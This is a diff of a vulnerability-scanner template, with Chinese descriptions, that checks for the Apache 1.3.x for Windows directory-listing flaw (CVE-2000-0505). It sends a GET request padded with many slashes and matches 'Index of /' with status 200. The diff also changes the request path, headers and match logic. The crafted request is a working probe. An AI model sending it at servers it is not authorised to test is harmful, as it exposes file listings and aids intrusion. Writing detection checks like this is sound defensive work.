@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "检测 Apache 1.3.x for Windows 目录列表漏洞，通过发送包含大量斜杠的 URL 请求验证服务器是否返回目录列表"
+description = "验证 Apache 1.3.x Windows 版本目录遍历漏洞，发送包含大量斜杠的 HTTP GET 请求，检测是返回目录列表"
 id = "POC-AVE-2000-0422"
-name = "Apache Windows 目录列表泄漏漏洞 PoC"
+name = "CVE-2000-0505 PoC"
 severity = "medium"
 tags = ["ave-2000-0422"]
 vuln_id = [
@@ -11,36 +11,27 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/|||||||"
+path = "/{{BaseURL}}////////////////////////"
 protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "<title>Index of",
-    "Directory Listing",
-    "[/]</a>",
-    "Apache/1.3",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}//////////////////////////////////////////////////////////"
-protocol = "http"
+words = ["Index of /"]
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "<title>Index of",
-    "Directory Listing",
-    "[/]</a>",
-    "Apache/1.3",
-]
+status = [200]
+type = "status"
